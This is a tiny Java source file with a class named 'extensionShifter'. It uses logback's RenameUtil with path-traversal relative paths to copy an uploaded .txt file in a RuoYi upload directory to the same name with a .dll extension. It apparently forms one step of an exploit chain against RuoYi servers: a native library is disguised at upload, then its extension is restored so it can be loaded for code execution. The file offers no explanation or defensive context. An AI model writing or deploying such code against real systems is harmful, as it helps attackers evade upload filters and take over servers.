package tmp;

import ch.qos.logback.core.rolling.helper.RenameUtil;

public class extensionShifter {
    public static void main(String[] args) {
        RenameUtil renameUtil = new RenameUtil();
        renameUtil.renameByCopying("../../../../../../../ruoyi/uploadPath/upload/2025/08/01/com.ruoyi.quartz.task_20250801172826A005.txt", 
                "../../../../../../../ruoyi/uploadPath/upload/2025/08/01/com.ruoyi.quartz.task_20250801172826A005.dll");
    }
}
